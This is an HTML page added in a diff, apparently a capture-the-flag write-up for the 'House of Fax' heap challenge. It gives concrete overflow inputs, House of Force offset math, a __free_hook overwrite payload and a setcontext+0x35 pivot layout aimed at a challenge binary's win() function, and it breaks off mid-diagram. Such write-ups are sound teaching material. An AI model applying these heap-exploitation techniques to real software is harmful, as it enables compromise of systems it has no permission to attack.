@@ -1,0 +1,1032 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>House of Fax - Full Writeup</title>
+    <style>
+:root {
+  color-scheme: dark;
+  --bg: #000000;
+  --bg-soft: #0a0a0a;
+  --panel: rgba(10, 10, 10, 0.86);
+  --panel-strong: rgba(17, 17, 17, 0.94);
+  --panel-soft: rgba(255, 255, 255, 0.03);
+  --text: #fafafa;
+  --muted: #a1a1aa;
+  --muted-strong: #d4d4d8;
+  --border: rgba(255, 255, 255, 0.1);
+  --border-strong: rgba(255, 255, 255, 0.16);
+  --accent: #ffffff;
+  --success: #7ee787;
+  --warning: #f5c451;
+  --danger: #ff7b72;
+  --shadow: 0 24px 80px rgba(0, 0, 0, 0.42);
+  --radius-xl: 28px;
+  --radius-lg: 20px;
+  --radius-md: 16px;
+  --radius-sm: 12px;
+  --content-width: 1100px;
+}
+
+*,
+*::before,
+*::after {
+  box-sizing: border-box;
+}
+
+html {
+  scroll-behavior: smooth;
+}
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  color: var(--text);
+  font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+  line-height: 1.7;
+  background:
+    radial-gradient(circle at top, rgba(255, 255, 255, 0.12), transparent 0, transparent 18rem),
+    radial-gradient(circle at 20% 0%, rgba(255, 255, 255, 0.08), transparent 0, transparent 24rem),
+    linear-gradient(180deg, #060606 0%, #000000 34%, #050505 100%);
+}
+
+body::before {
+  content: "";
+  position: fixed;
+  inset: 0;
+  pointer-events: none;
+  background-image:
+    linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
+  background-size: 64px 64px;
+  mask-image: linear-gradient(180deg, rgba(0, 0, 0, 0.55), transparent 92%);
+  opacity: 0.14;
+}
+
+main,
+.page,
+.wrap,
+.sheet {
+  width: min(var(--content-width), calc(100vw - 32px));
+  margin: 0 auto;
+}
+
+main,
+.page,
+.wrap {
+  padding-top: 32px;
+  padding-bottom: 64px;
+}
+
+.sheet {
+  padding: 28px;
+}
+
+.body {
+  padding: 28px;
+}
+
+header,
+section,
+.hero,
+.card,
+.sheet,
+.toc,
+.box,
+.callout,
+.note,
+.warn,
+.good,
+.diagram,
+.quote,
+.result {
+  position: relative;
+  background: linear-gradient(180deg, var(--panel-strong), var(--panel));
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  box-shadow: var(--shadow);
+  backdrop-filter: blur(12px);
+}
+
+header,
+section,
+.hero,
+.toc,
+.box,
+.callout,
+.note,
+.warn,
+.good,
+.diagram,
+.quote,
+.result {
+  padding: 28px;
+  margin-bottom: 18px;
+}
+
+.card {
+  padding: 18px;
+}
+
+h1,
+h2,
+h3 {
+  margin: 0 0 14px;
+  color: var(--text);
+  line-height: 1.1;
+  letter-spacing: -0.03em;
+}
+
+h1 {
+  font-size: clamp(2.2rem, 6vw, 4.75rem);
+  font-weight: 700;
+}
+
+h2 {
+  font-size: clamp(1.35rem, 2.2vw, 1.95rem);
+  font-weight: 650;
+  padding-bottom: 10px;
+  border-bottom: 1px solid var(--border);
+}
+
+h3 {
+  font-size: clamp(1.05rem, 1.4vw, 1.3rem);
+  font-weight: 600;
+  color: var(--muted-strong);
+}
+
+p,
+li,
+td,
+th,
+figcaption {
+  font-size: 1rem;
+  color: var(--muted-strong);
+}
+
+p,
+ul,
+ol,
+table,
+pre {
+  margin-top: 0;
+}
+
+ul,
+ol {
+  padding-left: 1.25rem;
+}
+
+li + li {
+  margin-top: 0.5rem;
+}
+
+a {
+  color: var(--text);
+  text-decoration-color: rgba(255, 255, 255, 0.35);
+  text-underline-offset: 0.18em;
+}
+
+a:hover {
+  text-decoration-color: rgba(255, 255, 255, 0.7);
+}
+
+strong {
+  color: var(--text);
+}
+
+code,
+.mono,
+.label,
+.pill,
+.meta,
+.flag {
+  font-family: ui-monospace, SFMono-Regular, SF Mono, Menlo, Consolas, "Liberation Mono", monospace;
+}
+
+code,
+.mono,
+.label,
+.pill {
+  display: inline-block;
+  padding: 0.12rem 0.45rem;
+  border-radius: 999px;
+  background: rgba(255, 255, 255, 0.06);
+  border: 1px solid rgba(255, 255, 255, 0.08);
+  color: var(--text);
+  font-size: 0.92em;
+  word-break: break-word;
+}
+
+pre {
+  overflow-x: auto;
+  padding: 18px;
+  border-radius: var(--radius-md);
+  border: 1px solid var(--border);
+  background: #050505;
+  color: #f4f4f5;
+  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.04);
+}
+
+pre code {
+  display: inline;
+  padding: 0;
+  border: 0;
+  border-radius: 0;
+  background: transparent;
+}
+
+table {
+  display: block;
+  width: 100%;
+  overflow-x: auto;
+  border-collapse: collapse;
+  border-spacing: 0;
+  border: 1px solid var(--border);
+  border-radius: var(--radius-md);
+}
+
+thead,
+tbody,
+tr {
+  width: 100%;
+}
+
+th,
+td {
+  padding: 12px 14px;
+  text-align: left;
+  vertical-align: top;
+  border-bottom: 1px solid var(--border);
+  border-right: 1px solid var(--border);
+  background: rgba(255, 255, 255, 0.02);
+}
+
+th {
+  color: var(--text);
+  background: rgba(255, 255, 255, 0.05);
+  font-weight: 600;
+}
+
+tr:last-child td {
+  border-bottom: 0;
+}
+
+th:last-child,
+td:last-child {
+  border-right: 0;
+}
+
+.lead,
+.lede,
+.subtitle,
+.muted,
+.small,
+.mini,
+.footer {
+  color: var(--muted);
+}
+
+.meta {
+  display: inline-block;
+  padding: 0.4rem 0.8rem;
+  border-radius: 999px;
+  border: 1px solid var(--border);
+  background: rgba(255, 255, 255, 0.04);
+  font-size: 0.94rem;
+  color: var(--muted);
+}
+
+.grid,
+.cards,
+.two-col {
+  display: grid;
+  gap: 14px;
+}
+
+.grid,
+.cards {
+  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+}
+
+.two-col {
+  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+}
+
+.meta:has(> div) {
+  display: grid;
+  gap: 14px;
+  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+  padding: 0;
+  border: 0;
+  background: transparent;
+}
+
+.card,
+.meta > div {
+  background: linear-gradient(180deg, rgba(255, 255, 255, 0.045), rgba(255, 255, 255, 0.025));
+  border: 1px solid var(--border);
+  border-radius: var(--radius-md);
+}
+
+.meta > div {
+  padding: 16px;
+}
+
+.flag,
+.result {
+  display: inline-block;
+  padding: 0.85rem 1rem;
+  border-radius: var(--radius-sm);
+  border: 1px solid rgba(126, 231, 135, 0.32);
+  background: rgba(126, 231, 135, 0.08);
+  color: #d3f9d8;
+  font-size: 0.98rem;
+  word-break: break-word;
+}
+
+.note,
+.callout,
+.good,
+.success {
+  border-left: 3px solid var(--success);
+}
+
+.warn,
+.warning,
+.box.warn {
+  border-left: 3px solid var(--warning);
+}
+
+.quote,
+.diagram,
+.toc {
+  border-left: 3px solid rgba(255, 255, 255, 0.25);
+}
+
+.eyebrow,
+.diagram-title {
+  color: var(--muted);
+  text-transform: uppercase;
+  letter-spacing: 0.18em;
+  font-size: 0.78rem;
+  margin-bottom: 14px;
+}
+
+img,
+svg,
+video,
+canvas {
+  max-width: 100%;
+  height: auto;
+}
+
+@media (max-width: 900px) {
+  main,
+  .page,
+  .wrap {
+    width: min(var(--content-width), calc(100vw - 20px));
+    padding-top: 18px;
+    padding-bottom: 40px;
+  }
+
+  header,
+  section,
+  .hero,
+  .toc,
+  .box,
+  .callout,
+  .note,
+  .warn,
+  .good,
+  .diagram,
+  .quote,
+  .result {
+    padding: 20px;
+    border-radius: 18px;
+  }
+
+  .card,
+  .meta > div {
+    padding: 16px;
+  }
+
+  h1 {
+    letter-spacing: -0.04em;
+  }
+
+  .sheet,
+  .body {
+    padding: 20px;
+  }
+}
+
+@media (max-width: 640px) {
+  body {
+    line-height: 1.6;
+  }
+
+  main,
+  .page,
+  .wrap,
+  .sheet {
+    width: calc(100vw - 16px);
+  }
+
+  header,
+  section,
+  .hero,
+  .toc,
+  .box,
+  .callout,
+  .note,
+  .warn,
+  .good,
+  .diagram,
+  .quote,
+  .result {
+    padding: 16px;
+    margin-bottom: 14px;
+    border-radius: 16px;
+  }
+
+  .grid,
+  .cards,
+  .two-col,
+  .meta:has(> div) {
+    grid-template-columns: 1fr;
+  }
+
+  pre,
+  table {
+    font-size: 0.92rem;
+  }
+
+  .sheet,
+  .body {
+    padding: 16px;
+  }
+}
+  </style>
+
+</head>
+<body>
+  <main class="sheet">
+    <header class="hero">
+      <div class="eyebrow">Full Exploit Writeup</div>
+      <h1>House of Fax</h1>
+      <p>This document explains the challenge from start to finish: what the binary does, where the vulnerability is, why the heap primitive is strong, how the primary exploit works, how the alternate <code>setcontext</code> exploit works, and what the provided solver output means.</p>
+    </header>
+
+    <div class="body">
+      <div class="toc">
+        <h2>Contents</h2>
+        <ol>
+          <li>Challenge Summary</li>
+          <li>Initial Recon and Runtime Setup</li>
+          <li>Program Logic</li>
+          <li>RLE Input Format</li>
+          <li>The Vulnerability in <code>rle_decode()</code></li>
+          <li>Heap Layout and Why the Top Chunk Is Reachable</li>
+          <li>Banner Leaks and Why They Matter</li>
+          <li>House of Force Math</li>
+          <li>Primary Exploit: <code>__free_hook -&gt; win()</code></li>
+          <li>Alternate Exploit: <code>__free_hook -&gt; setcontext+0x35 -&gt; win()</code></li>
+          <li>What Was Tried and Rejected</li>
+          <li>Interpreting the Solver Transcript</li>
+          <li>Final Notes</li>
+        </ol>
+      </div>
+
+      <h2>Challenge Summary</h2>
+      <p><code>fax_machine</code> is a Linux x86_64 pwn challenge built around a broken run-length decoder. The fax machine accepts image dimensions and a compressed stream of black and white pixel runs. The hidden twist is that the decoder does not stop writing once the destination image is full. Because of that, the final RLE token can keep writing beyond the heap buffer and corrupt adjacent heap metadata.</p>
+      <p>The binary is also generous enough to leak a heap address and a libc address before asking for input. That combination makes the challenge much less about brute force and much more about recognizing the intended heap technique.</p>
+
+      <div class="cards">
+        <div class="card">
+          <h3>Architecture</h3>
+          <p>x86_64 ELF</p>
+        </div>
+        <div class="card">
+          <h3>Bundled glibc</h3>
+          <p><code>libc-2.27.so</code></p>
+        </div>
+        <div class="card">
+          <h3>Main Technique</h3>
+          <p>House of Force</p>
+        </div>
+        <div class="card">
+          <h3>Hidden Target</h3>
+          <p><code>win()</code> prints <code>flag.txt</code></p>
+        </div>
+      </div>
+
+      <div class="good">
+        <p><strong>Bottom line:</strong> the challenge is solvable with a top-chunk size overwrite, followed by a controlled allocation into libc, followed by a hook overwrite.</p>
+      </div>
+
+      <h2>Initial Recon and Runtime Setup</h2>
+      <p>The challenge ships with three important files:</p>
+      <ul>
+        <li><code>fax_machine</code></li>
+        <li><code>ld-2.27.so</code></li>
+        <li><code>libc-2.27.so</code></li>
+      </ul>
+
+      <p>That strongly suggests the intended runtime is the bundled glibc 2.27, not the system libc. For accurate offsets and stable exploitation, the binary should be launched with the provided loader and library path.</p>
+
+      <pre>./ld-2.27.so --library-path . ./fax_machine</pre>
+
+      <p>A useful convenience step is creating a symlink so the old loader finds the expected soname:</p>
+
+      <pre>ln -s libc-2.27.so libc.so.6</pre>
+
+      <p>The binary itself is not stripped, which makes reversing much easier. Important symbols are visible directly, including <code>rle_decode</code>, <code>fax_machine</code>, <code>banner</code>, and <code>win</code>.</p>
+
+      <h2>Program Logic</h2>
+      <p>At a high level, the binary behaves like this:</p>
+
+      <ol>
+        <li><code>main()</code> prints the intro banner.</li>
+        <li><code>banner()</code> leaks a heap pointer and the address of <code>free()</code>.</li>
+        <li><code>fax_machine()</code> enters a loop asking for width and height.</li>
+        <li>It calls <code>rle_decode(width, height)</code> to allocate and fill a bitmap.</li>
+        <li>If the bitmap size is at most <code>0x1000</code> bytes, it prints the image and frees it.</li>
+        <li>If the bitmap is larger than <code>0x1000</code>, it skips <code>free()</code> and loops back for another image.</li>
+      </ol>
+
+      <div class="warn">
+        <p><strong>This size gate is critical.</strong> The exploit intentionally uses a large bitmap in stage 1 so the corrupted heap state stays alive. If the bitmap were freed immediately, the exploit would become much more fragile.</p>
+      </div>
+
+      <div class="diagram">
+        <div class="diagram-title">Diagram 1. High-level program flow</div>
+        <svg viewBox="0 0 920 220" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Program flow diagram">
+          <defs>
+            <marker id="arrow" markerWidth="12" markerHeight="12" refX="10" refY="6" orient="auto">
+              <path d="M0,0 L12,6 L0,12 z" fill="#8f2d14"/>
+            </marker>
+          </defs>
+          <rect x="20" y="60" width="145" height="70" rx="8" fill="#fff7eb" stroke="#c97a1f" stroke-width="2"/>
+          <text x="92" y="88" text-anchor="middle" font-size="20" fill="#191510">banner()</text>
+          <text x="92" y="112" text-anchor="middle" font-size="15" fill="#61574c">heap leak</text>
+          <text x="92" y="132" text-anchor="middle" font-size="15" fill="#61574c">free leak</text>
+
+          <rect x="210" y="60" width="145" height="70" rx="8" fill="#fff7eb" stroke="#c97a1f" stroke-width="2"/>
+          <text x="282" y="88" text-anchor="middle" font-size="20" fill="#191510">input</text>
+          <text x="282" y="112" text-anchor="middle" font-size="15" fill="#61574c">width</text>
+          <text x="282" y="132" text-anchor="middle" font-size="15" fill="#61574c">height + RLE</text>
+
+          <rect x="400" y="60" width="165" height="70" rx="8" fill="#fff7eb" stroke="#c97a1f" stroke-width="2"/>
+          <text x="482" y="88" text-anchor="middle" font-size="20" fill="#191510">rle_decode()</text>
+          <text x="482" y="112" text-anchor="middle" font-size="15" fill="#61574c">alloc bitmap</text>
+          <text x="482" y="132" text-anchor="middle" font-size="15" fill="#61574c">decode runs</text>
+
+          <rect x="610" y="32" width="130" height="55" rx="8" fill="#eef8ef" stroke="#4b7b4d" stroke-width="2"/>
+          <text x="675" y="60" text-anchor="middle" font-size="18" fill="#191510">size &gt; 0x1000</text>
+          <text x="675" y="80" text-anchor="middle" font-size="15" fill="#61574c">keep chunk</text>
+
+          <rect x="610" y="118" width="130" height="55" rx="8" fill="#fff1ef" stroke="#8f2d14" stroke-width="2"/>
+          <text x="675" y="146" text-anchor="middle" font-size="18" fill="#191510">size ≤ 0x1000</text>
+          <text x="675" y="166" text-anchor="middle" font-size="15" fill="#61574c">print + free</text>
+
+          <rect x="785" y="60" width="110" height="70" rx="8" fill="#fff7eb" stroke="#c97a1f" stroke-width="2"/>
+          <text x="840" y="92" text-anchor="middle" font-size="20" fill="#191510">loop</text>
+          <text x="840" y="118" text-anchor="middle" font-size="15" fill="#61574c">next image</text>
+
+          <line x1="165" y1="95" x2="210" y2="95" stroke="#8f2d14" stroke-width="3" marker-end="url(#arrow)"/>
+          <line x1="355" y1="95" x2="400" y2="95" stroke="#8f2d14" stroke-width="3" marker-end="url(#arrow)"/>
+          <line x1="565" y1="95" x2="610" y2="60" stroke="#8f2d14" stroke-width="3" marker-end="url(#arrow)"/>
+          <line x1="565" y1="95" x2="610" y2="145" stroke="#8f2d14" stroke-width="3" marker-end="url(#arrow)"/>
+          <line x1="740" y1="60" x2="785" y2="95" stroke="#8f2d14" stroke-width="3" marker-end="url(#arrow)"/>
+          <line x1="740" y1="145" x2="785" y2="95" stroke="#8f2d14" stroke-width="3" marker-end="url(#arrow)"/>
+        </svg>
+      </div>
+
+      <h2>RLE Input Format</h2>
+      <p>The program decodes a text-based run-length encoding. Each token is:</p>
+      <ul>
+        <li><code>W&lt;count&gt;</code> for a run of white pixels</li>
+        <li><code>B&lt;count&gt;</code> for a run of black pixels</li>
+      </ul>
+
+      <p>The decoder accepts uppercase or lowercase color letters. Tokens are separated by spaces and read from one input line using <code>fgets()</code>.</p>
+
+      <p>For example:</p>
+
+      <pre>W8 B8 W8 B8</pre>
+
+      <p>would generate alternating blocks of 8 white and 8 black bits.</p>
+
+      <p>The challenge hint, “manually compress the image data,” is really telling us to stop thinking like a normal user who wants to send a picture and start thinking like an attacker who wants to craft the decoder’s write pattern directly.</p>
+
+      <h2>The Vulnerability in <code>rle_decode()</code></h2>
+      <p>The decoder computes the total number of bits as <code>width * height</code>, allocates exactly enough bytes for those bits, and then parses each RLE token one by one.</p>
+
+      <p>The bug is not in the allocation size itself. The bug is in the inner write loop. Once a run length has been parsed, the decoder writes that many bits into the output buffer without checking, inside the loop, whether the bitmap is already full.</p>
+
+      <pre>total_bits = width * height
+total_bytes = (total_bits + 7) &gt;&gt; 3
+buf = malloc(total_bytes)
+
+for each token:
+    parse color and count
+    for i in range(count):
+        write one bit to buf[current_bits / 8]
+        current_bits += 1
+
+# the bound check happens only outside the per-bit loop</pre>
+
+      <p>That means the final token can be oversized and continue writing past the end of the chunk. The last run is the dangerous one because the outer loop will stop only after the decoder finishes the entire token.</p>
+
+      <div class="note">
+        <p><strong>Exploit idea:</strong> choose a bitmap size that places the top chunk immediately after the destination buffer, then make the final run large enough to smash the top chunk size field.</p>
+      </div>
+
+      <h2>Heap Layout and Why the Top Chunk Is Reachable</h2>
+      <p>The decoder uses one heap allocation for the bitmap. For a fresh process, that allocation comes from the main arena, and the next chunk after it is normally the top chunk. So if we write far enough past the bitmap, we do not need a complex heap grooming strategy. We can directly corrupt the top chunk metadata.</p>
+
+      <p>The exploit uses a width and height that decode to <code>0x1001</code> bytes:</p>
+
+      <pre>width = 4097
+height = 8
+total_bits = 4097 * 8 = 32776
+total_bytes = (32776 + 7) &gt;&gt; 3 = 4097 = 0x1001</pre>
+
+      <p>This size is ideal for two reasons:</p>
+      <ol>
+        <li>it is large enough that <code>fax_machine()</code> will skip the later <code>free()</code>,</li>
+        <li>it still gives a predictable top-chunk position relative to the leaked heap address.</li>
+      </ol>
+
+      <p>The stage-1 overflow token is:</p>
+
+      <pre>B33024</pre>
+
+      <p>That run is much larger than the declared image size and keeps writing into the next chunk’s metadata, including the top chunk size field.</p>
+
+      <div class="diagram">
+        <div class="diagram-title">Diagram 2. Stage-1 heap layout and overflow into the top chunk</div>
+        <svg viewBox="0 0 920 260" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Heap layout overflow diagram">
+          <defs>
+            <marker id="arrow2" markerWidth="12" markerHeight="12" refX="10" refY="6" orient="auto">
+              <path d="M0,0 L12,6 L0,12 z" fill="#8f2d14"/>
+            </marker>
+          </defs>
+          <rect x="40" y="90" width="200" height="80" fill="#eef8ef" stroke="#4b7b4d" stroke-width="2"/>
+          <text x="140" y="120" text-anchor="middle" font-size="20" fill="#191510">heap leak chunk</text>
+          <text x="140" y="145" text-anchor="middle" font-size="15" fill="#61574c">small malloc from banner()</text>
+
+          <rect x="240" y="90" width="370" height="80" fill="#fff7eb" stroke="#c97a1f" stroke-width="2"/>
+          <text x="425" y="120" text-anchor="middle" font-size="21" fill="#191510">stage-1 bitmap chunk</text>
+          <text x="425" y="145" text-anchor="middle" font-size="15" fill="#61574c">0x1001-byte decoded image</text>
+
+          <rect x="610" y="90" width="130" height="80" fill="#fff1ef" stroke="#8f2d14" stroke-width="2"/>
+          <text x="675" y="118" text-anchor="middle" font-size="20" fill="#191510">top chunk</text>
+          <text x="675" y="143" text-anchor="middle" font-size="15" fill="#61574c">size field</text>
+
+          <rect x="740" y="90" width="140" height="80" fill="#f7f1ff" stroke="#6d4aa2" stroke-width="2"/>
+          <text x="810" y="120" text-anchor="middle" font-size="18" fill="#191510">future arena</text>
+          <text x="810" y="145" text-anchor="middle" font-size="15" fill="#61574c">allocations</text>
+
+          <path d="M490,60 C560,20 620,20 675,76" fill="none" stroke="#8f2d14" stroke-width="4" marker-end="url(#arrow2)"/>
+          <text x="560" y="28" text-anchor="middle" font-size="17" fill="#8f2d14">oversized final run writes past bitmap</text>
+
+          <text x="40" y="210" font-size="16" fill="#61574c">Goal: smash the top chunk size so the next allocation can be forced to an attacker-chosen address.</text>
+        </svg>
+      </div>
+
+      <h2>Banner Leaks and Why They Matter</h2>
+      <p>The binary gives away exactly the two addresses needed for a clean libc heap exploit:</p>
+      <ul>
+        <li>a heap leak from <code>malloc(1)</code></li>
+        <li>a libc leak from the resolved address of <code>free()</code></li>
+      </ul>
+
+      <p>Those leaks let us compute:</p>
+      <ul>
+        <li>the position of the current top chunk, and</li>
+        <li>the location of hooks and gadgets inside libc.</li>
+      </ul>
+
+      <table>
+        <thead>
+          <tr>
+            <th>Symbol / Value</th>
+            <th>Offset</th>
+            <th>Why it matters</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><code>free@@GLIBC_2.2.5</code></td>
+            <td><code>0x80490</code></td>
+            <td>Used to compute libc base</td>
+          </tr>
+          <tr>
+            <td><code>__free_hook</code></td>
+            <td><code>0x3af8c8</code></td>
+            <td>Main primary target</td>
+          </tr>
+          <tr>
+            <td><code>__malloc_hook</code></td>
+            <td><code>0x3adc10</code></td>
+            <td>Tested as an alternative target</td>
+          </tr>
+          <tr>
+            <td><code>setcontext</code></td>
+            <td><code>0x43fe0</code></td>
+            <td>Used in the second verified exploit</td>
+          </tr>
+          <tr>
+            <td><code>win()</code></td>
+            <td><code>0x400bc4</code></td>
+            <td>Prints <code>flag.txt</code></td>
+          </tr>
+        </tbody>
+      </table>
+
+      <h2>House of Force Math</h2>
+      <p>Once the top chunk size is corrupted to a huge value, the next allocation can be aimed at a target address by choosing the right request size.</p>
+
+      <p>The exploit uses the leaked heap pointer to estimate the top chunk after stage 1:</p>
+
+      <pre>old_top = heap + 0x1020</pre>
+
+      <p>That value matches the chunk alignment and metadata placement for the <code>0x1001</code>-byte allocation. From there, if we want the next user pointer to become <code>target_user</code>, the request size is:</p>
+
+      <pre>req = ((target_user - 0x10) - old_top) - 8</pre>
+
+      <p>This is the standard House-of-Force relation:</p>
+      <ul>
+        <li><code>old_top</code> points to the current top chunk header,</li>
+        <li><code>target_user - 0x10</code> converts a desired user pointer back to a chunk header,</li>
+        <li><code>- 8</code> compensates for how glibc rounds and accounts for request sizes.</li>
+      </ul>
+
+      <h2>Primary Exploit: <code>__free_hook -&gt; win()</code></h2>
+
+      <h3>Stage 1: Create the top-chunk overwrite</h3>
+      <p>The exploit sends:</p>
+
+      <pre>width  = 4097
+height = 8
+RLE    = B33024</pre>
+
+      <p>This allocates a bitmap of <code>0x1001</code> bytes, overflows into the top chunk, and leaves the bitmap allocated because the program skips freeing large images.</p>
+
+      <h3>Stage 2: Move the top chunk near <code>__free_hook</code></h3>
+      <p>Using the libc leak, the exploit computes:</p>
+
+      <pre>libc_base  = free_addr - 0x80490
+free_hook  = libc_base + 0x3af8c8
+stage3_user = free_hook - 0x28</pre>
+
+      <p>The <code>-0x28</code> landing is not arbitrary. It was found to be a stable offset that allows a forward write into <code>__free_hook</code> without depending on unstable exact-adjacent chunk placement.</p>
+
+      <h3>Stage 3: Overwrite the hook</h3>
+      <p>The final stage writes:</p>
+
+      <pre>payload = b"\\x00" * 40 + p64(win)</pre>
+
+      <p>Because the stage-3 user pointer is at <code>__free_hook - 0x28</code>, writing 40 bytes of filler positions the <code>win</code> pointer exactly over <code>__free_hook</code>.</p>
+
+      <h3>Trigger</h3>
+      <p>After the stage-3 bitmap is decoded, the program follows its normal logic for small images: it prints the image and then calls <code>free(bitmap)</code>. glibc checks <code>__free_hook</code> before doing the real free logic, so control transfers directly to <code>win()</code>.</p>
+
+      <pre>__free_hook(bitmap, caller) -&gt; win()</pre>
+
+      <p>Extra arguments are harmless on x86_64 here because <code>win()</code> does not care about them.</p>
+
+      <div class="good">
+        <p><strong>Result:</strong> the primary solver is stable and verified. It prints the flag if the runtime environment has a real <code>flag.txt</code>.</p>
+      </div>
+
+      <div class="diagram">
+        <div class="diagram-title">Diagram 3. Primary exploit path</div>
+        <svg viewBox="0 0 920 220" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Primary exploit path diagram">
+          <defs>
+            <marker id="arrow3" markerWidth="12" markerHeight="12" refX="10" refY="6" orient="auto">
+              <path d="M0,0 L12,6 L0,12 z" fill="#8f2d14"/>
+            </marker>
+          </defs>
+          <rect x="28" y="70" width="170" height="78" rx="8" fill="#fff7eb" stroke="#c97a1f" stroke-width="2"/>
+          <text x="113" y="100" text-anchor="middle" font-size="19" fill="#191510">top chunk</text>
+          <text x="113" y="123" text-anchor="middle" font-size="19" fill="#191510">corrupted</text>
+
+          <rect x="252" y="70" width="190" height="78" rx="8" fill="#fff7eb" stroke="#c97a1f" stroke-width="2"/>
+          <text x="347" y="100" text-anchor="middle" font-size="19" fill="#191510">House of Force</text>
+          <text x="347" y="123" text-anchor="middle" font-size="15" fill="#61574c">next chunk lands near libc</text>
+
+          <rect x="496" y="70" width="172" height="78" rx="8" fill="#fff1ef" stroke="#8f2d14" stroke-width="2"/>
+          <text x="582" y="100" text-anchor="middle" font-size="18" fill="#191510">overwrite</text>
+          <text x="582" y="123" text-anchor="middle" font-size="19" fill="#191510">__free_hook = win</text>
+
+          <rect x="722" y="70" width="170" height="78" rx="8" fill="#eef8ef" stroke="#4b7b4d" stroke-width="2"/>
+          <text x="807" y="100" text-anchor="middle" font-size="18" fill="#191510">program calls</text>
+          <text x="807" y="123" text-anchor="middle" font-size="19" fill="#191510">free(bitmap)</text>
+
+          <line x1="198" y1="109" x2="252" y2="109" stroke="#8f2d14" stroke-width="3" marker-end="url(#arrow3)"/>
+          <line x1="442" y1="109" x2="496" y2="109" stroke="#8f2d14" stroke-width="3" marker-end="url(#arrow3)"/>
+          <line x1="668" y1="109" x2="722" y2="109" stroke="#8f2d14" stroke-width="3" marker-end="url(#arrow3)"/>
+
+          <text x="807" y="182" text-anchor="middle" font-size="18" fill="#4b7b4d">control flow jumps to win()</text>
+        </svg>
+      </div>
+
+      <h2>Alternate Exploit: <code>__free_hook -&gt; setcontext+0x35 -&gt; win()</code></h2>
+      <p>The second exploit intentionally uses a different control-flow sink. Instead of pointing <code>__free_hook</code> straight at <code>win()</code>, it points it at a useful gadget inside libc: <code>setcontext+0x35</code>.</p>
+
+      <h3>Why <code>setcontext+0x35</code> is useful</h3>
+      <p>In glibc 2.27, starting at this offset, <code>setcontext</code> restores a collection of registers from memory pointed to by <code>rdi</code>, sets <code>rsp</code> from a field in that structure, pushes a value loaded from another field, and then returns.</p>
+
+      <p>The important restored fields are:</p>
+
+      <table>
+        <thead>
+          <tr>
+            <th>Offset from fake frame</th>
+            <th>Register / use</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><code>+0xa0</code></td>
+            <td>restored <code>rsp</code></td>
+          </tr>
+          <tr>
+            <td><code>+0xa8</code></td>
+            <td>loaded into <code>rcx</code>, then pushed before <code>ret</code></td>
+          </tr>
+          <tr>
+            <td><code>+0x68</code></td>
+            <td>restored <code>rdi</code></td>
+          </tr>
+        </tbody>
+      </table>
+
+      <p>That means the freed chunk can be turned into a fake frame. Once <code>free()</code> calls our overwritten hook, <code>setcontext+0x35</code> uses the chunk contents as execution state.</p>
+
+      <h3>How the alternate payload works</h3>
+      <p>The stage-3 chunk still lands at <code>__free_hook - 0x28</code>. Its content is now structured like this:</p>
+
+      <pre>[0x00 .. 0x27]  filler
+[0x28 .. 0x2f]  __free_hook = setcontext+0x35
+...
+[0xa0 .. 0xa7]  fake rsp = stage3_user + 0x208
+[0xa8 .. 0xaf]  fake rcx = win
+[0x208 ..]      tiny stack area containing win</pre>
+
+      <p>When <code>free()</code> fires:</p>
+      <ol>
+        <li>glibc calls <code>__free_hook</code></li>
+        <li>control enters <code>setcontext+0x35</code></li>
+        <li><code>rsp</code> is restored from our fake frame</li>
+        <li><code>rcx</code> is pushed</li>
+        <li><code>ret</code> transfers execution into <code>win()</code></li>
+      </ol>
+
+      <p>This is a genuine second exploit path because it uses the same heap primitive but a different control-transfer mechanism. Instead of “hook directly to win,” it performs “hook to context restore, pivot to fake state, then jump to win.”</p>
+
+      <div class="good">
+        <p><strong>Result:</strong> the alternate solver <code>solve_setcontext.py</code> was also verified locally with a temporary test <code>flag.txt</code>.</p>
+      </div>
+
+      <div class="diagram">
+        <div class="diagram-title">Diagram 4. Alternate exploit path with <code>setcontext+0x35</code></div>
+        <svg viewBox="0 0 920 260" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Setcontext exploit path diagram">
+          <defs>
+            <marker id="arrow4" markerWidth="12" markerHeight="12" refX="10" refY="6" orient="auto">
+              <path d="M0,0 L12,6 L0,12 z" fill="#8f2d14"/>
+            </marker>
+          </defs>
+
+          <rect x="26" y="92" width="190" height="90" rx="8" fill="#fff1ef" stroke="#8f2d14" stroke-width="2"/>
+          <text x="121" y="123" text-anchor="middle" font-size="18" fill="#191510">__free_hook =</text>
+          <text x="121" y="149" text-anchor="middle" font-size="21" fill="#191510">setcontext+0x35</text>
+
+          <rect x="274" y="72" width="200" height="130" rx="8" fill="#fff7eb" stroke="#c97a1f" stroke-width="2"/>
+          <text x="374" y="102" text-anchor="middle" font-size="19" fill="#191510">freed stage-3 chunk</text>
+          <text x="374" y="128" text-anchor="middle" font-size="15" fill="#61574c">fake frame fields:</text>
+          <text x="374" y="150" text-anchor="middle" font-size="15" fill="#61574c">rsp at +0xa0</text>
+          <text x="374" y="172" text-anchor="middle" font-size="15" fill="#61574c">rcx at +0xa8</text>
+          <text x="374" y="194" text-anchor="middle" font-size="15" fill="#61574c">tiny stack at +0x208</text>
+
+          <rect x="532" y="92" width="150" height="90" rx="8" fill="#eef8ef" stroke="#4b7b4d" stroke-width="2"/>
+          <text x="607" y="125" text-anchor="middle" font-size="18" fill="#191510">restore rsp</text>
+          <text x="607" y="150" text-anchor="middle" font-size="18" fill="#191510">push rcx</text>
+
+          <rect x="740" y="92" width="150" height="90" rx="8" fill="#eef8ef" stroke="#4b7b4d" stroke-width="2"/>
+          <text x="815" y="125" text-anchor="middle" font-size="18" fill="#191510">ret into</text>
